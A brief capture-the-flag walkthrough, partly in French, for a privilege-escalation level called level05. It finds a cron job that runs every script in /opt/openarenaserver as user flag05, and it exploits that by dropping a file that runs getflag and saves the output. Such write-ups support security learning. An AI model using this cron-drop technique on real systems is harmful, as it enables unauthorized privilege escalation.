find / -user flag05 2> /dev/null 

cat /usr/sbin/openarenaserver

output :
#!/bin/sh

for i in /opt/openarenaserver/* ; do
        (ulimit -t 5; bash -x "$i")
        rm -f "$i"
done

breakdown :
Bash script that executes all files located in /opt/openarenaserver/

find / -name level05 2> /dev/null 
output :
/var/mail/level05
/rofs/var/mail/level05

cat /var/mail/level05
output :
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05

crontab qui execute la command avec la permission de flag05 toutes les deux minutes

Great! That means we can just paste the getflag executable in the /opt/openarenaserver
Not really cus its gonna get deleted after its executed ....
echo '/bin/getflag > /tmp/flag05' > /opt/openarenaserver/getflag05